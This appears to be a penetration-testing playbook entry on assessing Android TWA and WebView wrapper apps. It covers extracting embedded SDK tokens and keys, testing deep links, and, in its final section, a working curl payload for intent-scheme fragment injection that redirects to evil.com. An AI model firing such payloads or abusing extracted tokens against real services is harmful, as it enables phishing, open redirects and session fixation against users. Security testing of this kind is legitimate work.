# TWA / WebView Wrapper Apps

## Detection (Phase 2)

App has `LauncherActivity` extending `TwaLauncherActivity` or uses Chrome Custom Tabs to launch a URL. Minimal Java/Kotlin — no custom HTTP client, no native libs, no crypto. The APK is just a shell around a web app.

## Pivot Strategy — Skip Native RE, Focus On:

1. **Config extraction**: Firebase keys, analytics tokens (Adjust, Braze), OAuth client IDs from `Application.java`, `google-services.json`, `strings.xml`, `resources.arsc`
2. **Intent filter analysis**: Deep links, scheme handlers, `assetlinks.json` → test for intent scheme injection
3. **Launch parameters**: TWA query params (`?twa=1`), custom headers injected by the wrapper
4. **SDK tokens**: Embedded third-party tokens (Adjust app_token, Sentry DSN, Datadog client token) → test for write injection
5. **Web attack surface**: The real app is the web origin — pivot to `ptest` for full web testing

## What NOT to Waste Time On

Frida hooking (nothing to hook), root detection bypass (irrelevant), native lib RE (none exist), certificate pinning (uses system Chrome).

## TWA Identification

Check for `com.google.androidbrowserhelper.trusted` in decompiled source + `LauncherActivity extends n` (TrustedWebActivityService). XAPK with only config splits + tiny main APK (<1MB) = TWA. WinTicket lesson: 918KB XAPK, LauncherActivity just appends `?twa=1` to URL and launches Chrome Custom Tab. All auth/logic lives in web — APK reversing yields nothing useful.

## TWA Auth Testing Strategy

Since auth is web-based:
1. Map the web login flow via browser interception (not APK)
2. Check if JS bundles are gzip-compressed (serve as binary, not readable text)
3. Use browser DevTools network interception during real login
4. The `intent://` scheme callbacks are the mobile-specific attack surface
5. Test CSRF on intent-generating endpoints (Apple/Google OAuth callbacks)

## Intent Scheme URL Injection

**When:** Backend returns `Location: intent://...` with user-controlled data in the URL (common in OAuth callback endpoints like `/v1/auth/apple`, `/v1/auth/google`).

**Detection:** POST to OAuth endpoint → check if Location header contains `intent://callback?{YOUR_BODY}#Intent;...;end`.

**Exploitation — fragment boundary injection:**
```bash
# If POST body is reflected before the server's #Intent; fragment:
curl -X POST "https://api.target.com/v1/auth/apple" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-binary 'code=x#Intent;package=com.nonexistent;S.browser_fallback_url=https://evil.com;end//'
# Result: intent://callback?code=x#Intent;...;S.browser_fallback_url=https://evil.com;end//#Intent;package=real.app;...;end
# Android parses FIRST #Intent; block → attacker controls:
#   - browser_fallback_url (open redirect if app not installed)
#   - package (redirect to different app)
#   - action (override intent action)
```

**Impact:** Open redirect on Android (via fallback URL), phishing, session fixation. If victim doesn't have the app installed, browser navigates to attacker's URL.

**Key:** Use raw `#` (not `%23`) to inject — URL-encoded `%23` stays in query string, raw `#` splits the fragment.
